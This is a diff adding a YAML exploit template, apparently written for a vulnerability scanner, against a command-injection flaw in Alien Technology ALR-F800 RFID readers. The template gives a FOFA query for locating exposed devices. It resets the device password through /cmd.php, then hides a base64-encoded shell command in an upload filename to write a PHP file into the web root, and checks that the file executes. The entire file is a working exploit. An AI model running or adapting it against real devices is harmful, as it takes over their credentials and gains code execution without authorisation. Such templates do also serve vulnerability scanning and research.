@@ -1,0 +1,43 @@
+id: poc-yaml-alientechnology-alr-f800-rce
+info:
+  name: ALR-F800 upgrade.cgi 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: ALR-F800
+  fofa: title="Alien Technology ALR-F800 RFID Reader"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  pass: random_int(10000,90000)
+  authorization: base64("alien:"+pass)
+requests:
+- method: POST
+  path: /cmd.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd=password={{.pass}}
+  expression: "status_code == 200 && \ntrim(body) == pass\n"
+- method: POST
+  path: /cgi-bin/upgrade.cgi
+  headers:
+    Authorization: Basic {{.authorization}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ3keNKAe5AQ9G7bs
+  data: '------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
+
+    Content-Disposition: form-data; name="uploadedFile"; filename=";echo ZWNobyAiPD9waHAgZWNobyBtZDUoXCRfUkVRVUVTVFsnaWQnXSk7Pz4iID4gL3Zhci93d3cvc2hlbGx0ZXN0LnBocA==|
+    base64 -d | sh"
+
+    Content-Type: application/octet-stream
+
+
+    Hi！
+
+    ------WebKitFormBoundaryQ3keNKAe5AQ9G7bs'
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /shelltest.php?id={{.t1}}
+  expression: "status_code == 200 && \ntrim(body) == t2\n"
+transport: http
